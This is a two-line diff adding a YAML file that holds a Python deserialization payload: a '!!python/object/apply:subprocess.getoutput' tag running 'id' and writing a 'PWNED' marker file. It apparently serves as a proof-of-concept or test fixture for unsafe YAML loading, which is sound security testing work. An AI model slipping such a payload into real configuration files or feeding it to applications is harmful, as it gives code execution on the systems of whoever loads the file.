@@ -1,0 +1,2 @@
+!!python/object/apply:subprocess.getoutput
+- id; echo PWNED > pwned_obj2.txt
